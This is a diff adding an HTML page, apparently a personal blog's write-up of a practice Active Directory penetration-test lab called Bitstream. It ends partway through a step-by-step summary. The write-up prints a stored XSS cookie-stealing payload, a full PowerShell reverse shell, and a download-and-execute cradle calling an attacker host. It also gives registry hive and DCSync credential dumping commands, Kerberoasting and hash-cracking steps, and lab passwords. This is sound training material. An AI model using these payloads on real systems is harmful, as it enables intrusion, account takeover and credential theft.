@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bitstream - Full Guide and Writeup | Colby</title>
+  <link rel="stylesheet" href="/styles.css" />
+  <script>
+    // Immediately apply saved theme to prevent flickering
+    (function() {
+      const savedTheme = localStorage.getItem('colby-portfolio-theme') || 'dark';
+      document.documentElement.setAttribute('data-theme', savedTheme);
+    })();
+  </script>
+</head>
+<body>
+
+  <!-- Global Header Navigation -->
+  <header class="global-header">
+    <div class="header-container">
+      <a href="/index.html" class="header-logo">
+        <span class="logo-icon">🛡️</span>
+        <span class="logo-text">Colby<span class="accent-dot">.</span></span>
+      </a>
+      <nav class="header-nav" aria-label="Primary site navigation">
+        <a href="/index.html" class="nav-item">Home</a>
+        <a href="/writeups.html" class="nav-item active">Writeups</a>
+        <a href="/reports.html" class="nav-item ">Reports</a>
+        <a href="/blog.html" class="nav-item ">Blog</a>
+      </nav>
+      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle dark/light mode">
+        <svg class="sun-icon" viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="5"></circle>
+          <line x1="12" y1="1" x2="12" y2="3"></line>
+          <line x1="12" y1="21" x2="12" y2="23"></line>
+          <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+          <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+          <line x1="1" y1="12" x2="3" y2="12"></line>
+          <line x1="21" y1="12" x2="23" y2="12"></line>
+          <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+          <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+        </svg>
+        <svg class="moon-icon" viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <!-- Ambient background -->
+  <div class="bg-texture"></div>
+
+  <!-- Main Post Content -->
+  <main class="post-page">
+
+    <a class="blog-back" href="/writeups.html">← back to writeups</a>
+
+    <p class="post-page-date">Jul 2026</p>
+    <h1 class="post-page-title">Bitstream - Full Guide and Writeup</h1>
+
+    <div class="post-content">
+      <p>Condensed Summary with step-by-step at the very end!</p>
+
+<p>Welcome to bitstream, this is the network topology given to us, showing the range environment:</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783405030059.webp" alt="614" /></p>
+
+<p>We are also given the following info at the start:</p>
+
+<hr />
+
+<p>BitStream is a cloud storage provider that hosts sensitive data for enterprise clients. They have segmented their internal Active Directory environment (bitstream.hsm) and requested a full penetration test of their environment.</p>
+
+<p>You have been provided with VPN access to their Active Directory environment.</p>
+
+<p><strong>To make this lab a bit easier, Defender is only enabled on the Domain Controller.</strong></p>
+
+<hr />
+
+<p>Jumping right into initial recon and enumeration, the lab’s questions start with the webserver <code class="language-plaintext highlighter-rouge">10.0.0.5</code> or <code class="language-plaintext highlighter-rouge">web.bitstream.hsm</code>.</p>
+
+<p>Initial scan shows that port 22 and port 80 are open. Having no creds yet, we look toward port 80. <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783405572264.webp" alt="Bit Stream - FINAL-1783405572264" /></p>
+
+<p>While manually enumerating the website with Burp Suite open, we can only really see two most probable areas for paths, being login and quote, since they accept input. <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783406517748.webp" alt="309" /></p>
+
+<p>After poking around at login and looking for common areas to hide creds and web directories like /robots.txt, I found nothing, so I decided to run a directory fuzz with the command here:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feroxbuster <span class="nt">-u</span> http://10.0.0.5 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class="nt">-x</span> js,json,txt,bak
+</code></pre></div></div>
+
+<p>We get this result showing nothing really interesting other than the /portal page that redirects us. <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783406618948.webp" alt="Bit Stream - FINAL-1783406618948" /></p>
+
+<p>Seeing as I had no creds, and no way to get them, I turned my head to the other input-accepting endpoint: <code class="language-plaintext highlighter-rouge">/quote</code></p>
+
+<p>After further enumeration, I found that you could upload a message via <code class="language-plaintext highlighter-rouge">POST /quote</code>, and the server would actually appear to save it, giving a telling message alongside it.</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783406843393.webp" alt="531" /></p>
+
+<p>This gave me the idea to try and achieve cookie theft via stored XSS.</p>
+
+<p>First, I ran a Python web server to catch the cookie:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8000
+</code></pre></div></div>
+
+<p>With the server running, we can use a simple payload submitted to the <code class="language-plaintext highlighter-rouge">/quote</code> message field, which will steal and send back the cookie of the admin user who views the stored page:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="dl">'</span><span class="s1">http://YOURIP:8000/c?</span><span class="dl">'</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783462429565.webp" alt="Bit Stream - FINAL-1783462429565" /></p>
+
+<p>After a short wait, the cookie lands in our listener output.</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783462515492.webp" alt="Bit Stream - FINAL-1783462515492" /></p>
+
+<p>By using Burp Suite, we can see the cookie name for the website is <strong>session_id</strong>.</p>
+
+<p>Then we can right-click, inspect, and browse to Application, then under Storage find Cookies, and add a cookie manually like below: <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783462660758.webp" alt="Bit Stream - FINAL-1783462660758" /></p>
+
+<p>Upon refresh, we get our session as joey! <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783462760579.webp" alt="565" /></p>
+
+<p>Continuing with enumeration, the only button that leads somewhere promising is internal messaging.</p>
+
+<p>Inside messaging, we can view our inbox; clicking on a message shows a URL with an ID number per message. If this parameter is vulnerable to IDOR, then changing the number should show different messages:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://web.bitstream.hsm/portal/messages/3
+</code></pre></div></div>
+
+<p>A quick check confirms that it is! One of the messages that was not visible initially can be viewed by switching the ID to 27 in the URL, getting us the creds of the SQL machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://web.bitstream.hsm/portal/messages/27
+</code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783463415047.webp" alt="561" /></p>
+
+<p>Now, per the range questions, we are hinted to move toward the SQL machine.</p>
+
+<p>Using our newly acquired creds, we can use <code class="language-plaintext highlighter-rouge">impacket-mssqlclient</code> to get a stable remote connection.</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783464252317.webp" alt="Bit Stream - FINAL-1783464252317" /></p>
+
+<p>Then we can use the command <code class="language-plaintext highlighter-rouge">enable_xp_cmdshell</code> to allow direct command execution. <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> is also the answer to the first question in part 2.</p>
+
+<p>From here, there are a lot of different ways to get more stable remote access onto this machine. I chose to host a <code class="language-plaintext highlighter-rouge">shell.ps1</code> reverse shell on my Kali machine and have the SQL session download and execute it in memory.</p>
+
+<p>The shell.ps1 file contains a standard PowerShell TCP reverse shell. Save the following as <code class="language-plaintext highlighter-rouge">shell.ps1</code> on your Kali machine, replacing <code class="language-plaintext highlighter-rouge">YOURIP</code> and <code class="language-plaintext highlighter-rouge">YOURPORT</code>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"YOURIP"</span><span class="p">,</span><span class="n">YOURPORT</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nx">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="p">);</span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"PS "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&gt; "</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Start a listener on Kali and a Python server to serve the file, then execute from the SQL session:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Kali — terminal 1  </span>
+rlwrap nc <span class="nt">-lvnp</span> 4444
+
+<span class="c"># Kali — terminal 2  </span>
+python3 <span class="nt">-m</span> http.server 9090
+</code></pre></div></div>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">xp_cmdshell</span> <span class="n">powershell</span> <span class="nv">"IEX(New-Object Net.WebClient).DownloadString(''http://YOURIP:9090/shell.ps1'')"</span>
+</code></pre></div></div>
+
+<p>Hosted rev shell <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783464790531.webp" alt="Bit Stream - FINAL-1783464790531" /></p>
+
+<p>Command ran on SQL and call back <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783464870254.webp" alt="Bit Stream - FINAL-1783464870254" /></p>
+
+<p>Callback showing our shell and viewing our privileges</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783464908006.webp" alt="Bit Stream - FINAL-1783464908006" /></p>
+
+<p>Immediately something stands out in our privileges: <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege - Impersonate a client after authentication - Enabled</code></p>
+
+<p>Upon looking up how to exploit this privilege, we find a couple of ways, but I chose to use GodPotato: <strong>GodPotato</strong> coerces the SYSTEM account into authenticating to a fake COM endpoint, captures the token, and impersonates it. Because service accounts are granted <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> by design (Windows needs them to impersonate callers for access control), this privilege is almost always present on SQL Server and IIS service accounts  making it a reliable escalation path.</p>
+
+<p>First, download GodPotato to your Kali machine and serve it alongside shell.ps1:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe <span class="nt">-O</span> /tmp/GodPotato-NET4.exe
+</code></pre></div></div>
+
+<p>Then download it to the target from your reverse shell:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://YOURIP:9090/GodPotato-NET4.exe'</span><span class="p">,</span><span class="s1">'C:\Users\Public\Documents\gp.exe'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Once we upload the exe and run it, we can see it says we are running as NT AUTHORITY! <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783465539547.webp" alt="Bit Stream - FINAL-1783465539547" /></p>
+
+<p>First thing I will do is set up persistence to make it easier to remote in later.</p>
+
+<p>Dump all info from this PC’s SAM, SYSTEM, and SECURITY hives using GodPotato to run each command as SYSTEM (required to read the protected hives):</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\Documents\gp.exe</span><span class="w"> </span><span class="nt">-cmd</span><span class="w"> </span><span class="s2">"reg save HKLM\SAM C:\Users\Public\Documents\sam.hive"</span><span class="w">
+</span><span class="n">C:\Users\Public\Documents\gp.exe</span><span class="w"> </span><span class="nt">-cmd</span><span class="w"> </span><span class="s2">"reg save HKLM\SYSTEM C:\Users\Public\Documents\sys.hive"</span><span class="w">
+</span><span class="n">C:\Users\Public\Documents\gp.exe</span><span class="w"> </span><span class="nt">-cmd</span><span class="w"> </span><span class="s2">"reg save HKLM\SECURITY C:\Users\Public\Documents\sec.hive"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Start the SMB receiver on Kali, then copy the hive files across from the target:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Kali  </span>
+<span class="nb">sudo </span>impacket-smbserver share /home/kali/hacksmarter/bitstream/loot/ <span class="nt">-smb2support</span> <span class="nt">-username</span> kali <span class="nt">-password</span> kali
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Target — authenticate to the share then copy each file  </span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">\\YOURIP\share</span><span class="w"> </span><span class="nx">/user:kali</span><span class="w"> </span><span class="nx">kali</span><span class="w">
+</span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">C:\Users\Public\Documents\sam.hive</span><span class="w"> </span><span class="nx">\\YOURIP\share\</span><span class="w">
+</span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">C:\Users\Public\Documents\sys.hive</span><span class="w"> </span><span class="nx">\\YOURIP\share\</span><span class="w">
+</span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">C:\Users\Public\Documents\sec.hive</span><span class="w"> </span><span class="nx">\\YOURIP\share\</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783466775268.webp" alt="Bit Stream - FINAL-1783466775268" /></p>
+
+<p>Now we can parse the hives offline with secretsdump:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump <span class="nt">-sam</span> loot/sam.hive <span class="nt">-system</span> loot/sys.hive <span class="nt">-security</span> loot/sec.hive LOCAL
+</code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783466909552.webp" alt="Bit Stream - FINAL-1783466909552" /></p>
+
+<p>Finally, we achieve our persistence as admin on the SQL box using the recovered local Administrator hash:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.0.1.7 <span class="nt">-u</span> Administrator <span class="nt">-H</span> &lt;NT_HASH_FROM_SECRETSDUMP&gt;
+</code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783466960352.webp" alt="Bit Stream - FINAL-1783466960352" /></p>
+
+<p>Because of the dump, we also get bob’s cached domain credential hash.</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783472228946.webp" alt="Bit Stream - FINAL-1783472228946" /></p>
+
+<p>Cracking the DCC2 hash gives us <code class="language-plaintext highlighter-rouge">pokemon</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 2100 <span class="s1">'$DCC2$10240#bob#HASH'</span> /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p>Next, we get two paths: we can either use BloodHound now to answer the first question for the workstation/part 3, or we can use another impacket command to automatically search for kerberoastable users with our new AD creds.</p>
+
+<p>Before we can do any of this, we need a way to tunnel to the DC subnet (<code class="language-plaintext highlighter-rouge">10.0.2.0/24</code>), which is not directly reachable from our VPN.</p>
+
+<p>Although there are many ways to do this, I chose to use Ligolo-ng, a relatively new tool for tunneling made easy.</p>
+
+<p>First, I got the agent for the tunnel onto the SQL box, then ran it in the background so it survives session disconnects:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Start-Process</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="s2">"C:\Users\Public\Documents\agent.exe"</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"-connect YOURIP:11601 -ignore-cert"</span><span class="w"> </span><span class="nt">-WindowStyle</span><span class="w"> </span><span class="nx">Hidden</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783472987024.webp" alt="Bit Stream - FINAL-1783472987024" /></p>
+
+<p>Seeing our initiated connection back! <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783473009748.webp" alt="Bit Stream - FINAL-1783473009748" /></p>
+
+<p>Then type <code class="language-plaintext highlighter-rouge">session</code>, select session 1, and type <code class="language-plaintext highlighter-rouge">start</code>.</p>
+
+<p>Then, lastly, add the route for the DC subnet only  <strong>do not add <code class="language-plaintext highlighter-rouge">10.0.1.0/24</code></strong> as this will break the agent connection since the agent itself is on that subnet:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>ip route add 10.0.2.0/24 dev ligolo
+</code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783473173144.webp" alt="Bit Stream - FINAL-1783473173144" /></p>
+
+<p>Above, we can see we are able to ping the DC directly from our Kali machine!</p>
+
+<p>Now, back to enumerating the domain first method with <code class="language-plaintext highlighter-rouge">impacket-GetUserSPNs</code>, using bob’s cracked password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetUserSPNs bitstream.hsm/bob:<span class="s1">'pokemon'</span> <span class="nt">-dc-ip</span> 10.0.2.5 <span class="nt">-request</span> <span class="nt">-outputfile</span> /tmp/spns.txt
+</code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783473342972.webp" alt="Bit Stream - FINAL-1783473342972" /></p>
+
+<p>We immediately get our answer to the first question, which is <code class="language-plaintext highlighter-rouge">eddie</code>. Cracking the TGS hash gives us the password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 13100 /tmp/spns.txt /usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783473492074.webp" alt="Bit Stream - FINAL-1783473492074" /></p>
+
+<p>Second way to learn the kerberoastable user, and a better long-term option since we will use it again later  BloodHound.</p>
+
+<p>Again, there are many ways to collect the loot for BloodHound, but I chose <code class="language-plaintext highlighter-rouge">SharpHound.exe</code> since I have easy access to upload files. I won’t fully explain BloodHound here, but it’s worth looking up and learning if it’s new to you.</p>
+
+<p>Once in BloodHound, you can use Cypher queries to check kerberoastable users:</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783474212900.webp" alt="595" /></p>
+
+<p>Back to the attack chain, we have the password for eddie, and since the range hints at us working toward the workstation box, we need to enumerate it.</p>
+
+<p>Simple Nmap scans point toward nothing being open except for RDP and WinRM. <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783474595892.webp" alt="Bit Stream - FINAL-1783474595892" /></p>
+
+<p>Since eddie is not in the Remote Management Users group and is denied WinRM, we pivot toward RDP:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /u:eddie /p:<span class="s1">'superman'</span> /d:bitstream.hsm /v:10.0.1.6 /cert:ignore
+</code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783474778072.webp" alt="301" /></p>
+
+<p>This part of the lab could be a little tricky; the only info we know is that we want to get the password for <code class="language-plaintext highlighter-rouge">Luisa</code>.</p>
+
+<p>Enumeration of the box for anything that could be a backup file or script leads to no findings.</p>
+
+<p>Our user also has no files anywhere except for a few shortcuts on his desktop.</p>
+
+<p>The only thing <strong>vaguely</strong> intriguing is the Microsoft Edge shortcut  its <code class="language-plaintext highlighter-rouge">Last Modified</code> timestamp is noticeably more recent than the other desktop icons, suggesting it has been used or changed recently.</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783475100795.webp" alt="Bit Stream - FINAL-1783475100795" /></p>
+
+<p>Opening it shows restore pages. <br />
+<img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783547533846.webp" alt="Bit Stream - FINAL-1783547533846" /></p>
+
+<p>Upon clicking it, you get prompted to view a saved password. After entering eddie’s password to confirm identity, the saved credential for Luisa is revealed:</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783475470779.webp" alt="Bit Stream - FINAL-1783475470779" /></p>
+
+<p>Now completing the answer for part 3: <code class="language-plaintext highlighter-rouge">Luisa:Lulu_Des1gn!!</code></p>
+
+<p>Moving toward the share machine, our first question is: What permission does Luisa have over James in the Active Directory environment?</p>
+
+<p>Taking a look at BloodHound, we can search for our new pwned user and view their outbound control. <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783475733357.webp" alt="Bit Stream - FINAL-1783475733357" /></p>
+
+<p>So our answer is <code class="language-plaintext highlighter-rouge">GenericAll</code>.</p>
+
+<p>But what does this do for us?</p>
+
+<p><code class="language-plaintext highlighter-rouge">GenericAll</code> is the highest level of AD object control  it means Luisa has full control over the james account, including the ability to reset his password without knowing the current one.</p>
+
+<p>Reading along in BloodHound, we can see one extremely useful technique under Linux abuse:</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783475893380.webp" alt="Bit Stream - FINAL-1783475893380" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net rpc password <span class="s2">"TargetUser"</span> <span class="s2">"newP@ssword2022"</span> <span class="nt">-U</span> <span class="s2">"DOMAIN"</span>/<span class="s2">"ControlledUser"</span>%<span class="s2">"Password"</span> <span class="nt">-S</span> <span class="s2">"DomainController"</span>
+</code></pre></div></div>
+
+<p>So my working command would be:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net rpc password <span class="s2">"james"</span> <span class="s2">"P@ssw0rd"</span> <span class="nt">-U</span> <span class="s2">"bitstream.hsm"</span>/<span class="s2">"Luisa"</span>%<span class="s1">'Lulu_Des1gn!!'</span> <span class="nt">-S</span> <span class="s2">"10.0.2.5"</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note:</strong> The <code class="language-plaintext highlighter-rouge">!!</code> characters in Luisa’s password trigger bash history expansion. Wrapping the password in single quotes prevents this.</p>
+</blockquote>
+
+<p>No errors on run, and we can confirm the login works. <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783476107840.webp" alt="Bit Stream - FINAL-1783476107840" /></p>
+
+<p>Pwned another account!</p>
+
+<p>But we still haven’t answered the next question, which is <code class="language-plaintext highlighter-rouge">What is the password for svc_backup?</code></p>
+
+<p>I haven’t even seen this password yet, but since the area we are working under is the <strong>share</strong> machine, we know to check james’s creds against it.</p>
+
+<p>First, enumerate the share box: <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783476351639.webp" alt="Bit Stream - FINAL-1783476351639" /></p>
+
+<p>Since it is called the “share” machine, I decided to check out SMB first.</p>
+
+<p>Log on to SMB with our newly changed password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-smbclient <span class="s1">'bitstream.hsm/james:P@ssw0rd@10.0.1.5'</span>
+</code></pre></div></div>
+
+<p>Once in, we see: <img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783485761431.webp" alt="Bit Stream - FINAL-1783485761431" /></p>
+
+<p>Under Scripts, which is the only non-standard share here, we see the following scripts:</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783485797471.webp" alt="Bit Stream - FINAL-1783485797471" /></p>
+
+<p>Downloading and looking at the <code class="language-plaintext highlighter-rouge">Automated-AD-Backup.ps1</code> script gives us our creds!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get Automated-AD-Backup.ps1
+</code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783486027569.webp" alt="Bit Stream - FINAL-1783486027569" /></p>
+
+<p>This answers our question for this part: <code class="language-plaintext highlighter-rouge">svc_backup:P@ssw0rd2025!</code></p>
+
+<p>With this, we can take a look back at BloodHound to check updated attack routes.</p>
+
+<p>In BloodHound, we can see that <code class="language-plaintext highlighter-rouge">svc_backup</code> has DCSync rights over the Domain Controller  meaning we can request a replication of all domain hashes directly from the DC without needing to touch LSASS or drop any tools on the DC itself.</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783486287290.webp" alt="Bit Stream - FINAL-1783486287290" /></p>
+
+<p>We dump the hashes using secretsdump with svc_backup’s credentials:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump <span class="s1">'bitstream.hsm/svc_backup:P@ssw0rd2025!@10.0.2.5'</span>
+</code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783486754536.webp" alt="Bit Stream - FINAL-1783486754536" /></p>
+
+<p>Then it’s as simple as passing the domain Administrator hash to Evil-WinRM and remoting into the DC:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.0.2.5 <span class="nt">-u</span> Administrator <span class="nt">-H</span> &lt;DOMAIN_ADMIN_NT_HASH&gt;
+</code></pre></div></div>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783486962252.webp" alt="Bit Stream - FINAL-1783486962252" /></p>
+
+<p>Then grab our flag:</p>
+
+<p><img src="../assets/uploads/Bit%20Stream%20-%20FINAL-1783486943740.webp" alt="Bit Stream - FINAL-1783486943740" /></p>
+
+<hr />
+
+<h2 id="condensed-summary--exact-steps">Condensed Summary  Exact Steps</h2>
+
+<ol>
+  <li>Scan the webserver <code class="language-plaintext highlighter-rouge">web.bitstream.hsm</code> (10.0.0.5) and find ports 22 and 80 open.</li>
+  <li>Enumerate the website with Burp Suite and identify <code class="language-plaintext highlighter-rouge">login</code> and <code class="language-plaintext highlighter-rouge">/quote</code> as the only input-accepting endpoints.</li>
+  <li>Run <code class="language-plaintext highlighter-rouge">feroxbuster</code> for directory discovery, which only turns up a <code class="language-plaintext highlighter-rouge">/portal</code> page that redirects.</li>
+  <li>Submit a message via <code class="language-plaintext highlighter-rouge">POST /quote</code> and confirm the server stores it.</li>
+  <li>Host a Python listener (<code class="language-plaintext highlighter-rouge">python3 -m http.server 8000</code>) and submit a stored XSS payload (<code class="language-plaintext highlighter-rouge">&lt;script&gt;new Image().src='http://YOURIP:8000/c?'+document.cookie&lt;/script&gt;</code>) to steal the viewing user’s cookie.</li>
